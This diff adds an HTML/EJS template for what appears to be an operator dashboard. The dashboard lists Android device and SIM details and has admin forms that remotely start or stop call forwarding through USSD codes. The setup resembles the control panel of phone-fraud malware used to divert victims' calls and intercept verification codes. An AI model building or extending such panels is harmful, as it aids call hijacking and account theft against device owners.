@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Details</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+    h1 {
+      color: #333;
+    }
+    p {
+      font-size: 16px;
+      margin: 10px 0;
+    }
+    form {
+      margin-top: 15px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    input {
+      border: 1px solid #ccc;
+    }
+    button {
+      background: #007bff;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    .dashboard-btn {
+      display: block;
+      margin-top: 15px;
+      background: #28a745;
+      text-decoration: none;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .dashboard-btn:hover {
+      background: #218838;
+    }
+    /* Media query for improved mobile responsiveness */
+    @media (max-width: 600px) {
+      .container {
+        padding: 15px;
+      }
+      h1 {
+        font-size: 24px;
+      }
+      p, input, button, .dashboard-btn {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Device Information</h1>
+    <p>Model: <%= device.model %></p>
+    <p>Manufacturer: <%= device.manufacturer %></p>
+    <p>Android Version: <%= device.androidVersion %></p>
+    <p>Brand: <%= device.brand %></p>
+    <p>SIM Operator: <%= device.simOperator %></p>
+
+    <h2>Call Forwarding Status</h2>
+    <div class="status <%= currentNumber && currentNumber !== '##21#' ? 'active' : 'inactive' %>">
+      <% if (currentNumber) { %>
+        <% if (currentNumber === '##21#') { %>
+          <p>Status: <span style="color: red;">Deactivated</span></p>
+        <% } else { %>
+          <p>Status: <span style="color: green;">Activated</span></p>
+          <% 
+             // Extract the phone number from the USSD code format "*21*<phoneNumber>#"
+             let phoneNumber = currentNumber;
+             if(currentNumber.startsWith('*21*') && currentNumber.endsWith('#')){
+                phoneNumber = currentNumber.substring(4, currentNumber.length - 1);
+             }
+          %>
+          <p><strong>Phone Number:</strong> <%= phoneNumber %></p>
+        <% } %>
+      <% } else { %>
+        <p>No call forwarding code set.</p>
+      <% } %>
+    </div>
+
+    <!-- Start Call Forwarding (original form submission logic) -->
+    <form method="POST" action="/api/device/admin/set/<%= device._id %>">
+      <input type="text" name="phoneNumber" placeholder="Enter 10-digit Phone Number" required>
+      <button type="submit">Start Call Forwarding</button>
+    </form>
+
+    <!-- Stop Call Forwarding (original form submission logic) -->
+    <form method="POST" action="/api/device/admin/stop/<%= device._id %>">
+      <button type="submit">Stop Call Forwarding</button>
+    </form>
+    <br>
+    <a href="/api/data/detail/<%= device._id %>">View Details</a>
+    <br>
+    <br>
+    <!-- Dashboard Button -->
+    <a id="backToDashboard" class="dashboard-btn" href="/dashboard">Back to Dashboard</a>
+  </div>
+
+  <script>
+    // Sirf Dashboard navigation ka logic yahan hai.
+    document.addEventListener('DOMContentLoaded', function() {
+      const backBtn = document.getElementById('backToDashboard');
+      if (backBtn) {
+        backBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          window.location.href = '/dashboard';
+        });
+      }
+    });
+  </script>
+</body>
+</html>
